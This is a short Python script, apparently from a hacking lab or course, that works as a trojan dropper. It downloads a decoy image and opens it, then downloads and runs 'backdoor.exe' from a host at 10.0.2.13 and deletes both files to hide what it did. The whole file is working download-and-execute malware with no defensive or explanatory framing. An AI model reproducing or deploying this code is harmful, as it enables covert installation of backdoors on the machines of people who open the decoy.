import requests
import subprocess
import os
import tempfile


def download(url):
    response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download('http://10.0.2.13/evil-files/flowers.jpg')
subprocess.Popen('flowers.jpg', shell=True)

download('http://10.0.2.13/evil-files/backdoor.exe')
subprocess.call('backdoor.exe', shell=True)

os.remove('flowers.jpg')
os.remove('backdoor.exe')
